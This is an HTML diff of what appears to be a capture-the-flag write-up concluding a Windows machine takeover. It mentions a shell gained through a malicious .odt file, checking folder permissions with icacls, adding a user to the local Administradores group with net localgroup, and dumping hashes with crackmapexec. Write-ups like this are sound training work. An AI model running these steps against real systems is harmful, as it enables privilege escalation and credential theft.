-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_21.png" alt="Untitled" /></p>
-
-<p>Once we create a shell using the malicious .odt file as it is run by local admin we got a shell as local-admin, but to make this possible we need to find a path where local admin has execute permissions</p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_22.png" alt="Untitled" /></p>
-
-<p>important documents looks to be interesting so we check using the following command</p>
-
-<pre><code class="language-arduino">icacls "name of the directory"
-</code></pre>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_23.png" alt="Untitled" /></p>
-
-<ul>
-  <li>I: Objects metadata is allowed</li>
-  <li>OI: Having the possession of the object is allowed</li>
-  <li>CI: Inheriting from this object is allowed.</li>
-  <li>F: Full control</li>
-  <li>RX: Reading and executing is allowed.</li>
-  <li>M: Modifying is allowed.</li>
-</ul>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_24.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_25.png" alt="Untitled" /></p>
-
-<p>Add maya to Administrator to find the Administrator hash</p>
-
+<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_24.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_25.png" alt="Untitled" />
+<br /><br />
+Add maya to Administrator to find the Administrator hash
+<br /><br /></p>
 <div class="language-clojure highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">net</span><span class="w"> </span><span class="n">localgroup</span><span class="w"> </span><span class="n">Administradores</span><span class="w"> </span><span class="n">maya</span><span class="w"> </span><span class="n">/add</span><span class="w">
 </span></code></pre></div></div>
-
-<p>Using crackmapexec to dump hashes</p>
-
+<p><br /><br />
+Using crackmapexec to dump hashes
+<br /><br /></p>
 <div class="language-clojure highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">--pass-pol</span><span class="w"> </span><span class="n">to</span><span class="w"> </span><span class="n">support</span><span class="w"> </span><span class="nb">time</span><span class="w"> </span><span class="n">out</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="n">crackmapexec</span><span class="w">
 </span></code></pre></div></div>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_26.png" alt="Untitled" /></p>
-
-<p><img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_27.png" alt="Untitled" /></p>
-
-<p>Machine pwned!!!
+<p><br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_26.png" alt="Untitled" />
+<br /><br />
+<img src="/assets/images/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f/d11f8ba2-e853-43c2-9007-4b59c086c274-export-410450b0-4f01-44b6-bb34-b9959ebdf34f_Untitled_27.png" alt="Untitled" />
+<br /><br />
+Machine pwned!!!
+<br /><br />
 <script src="/assets/js/matrix-overlay.js"></script></p>
+
+<link rel="stylesheet" href="/assets/css/imagesstyle.css" />
+
 
 </div>
 
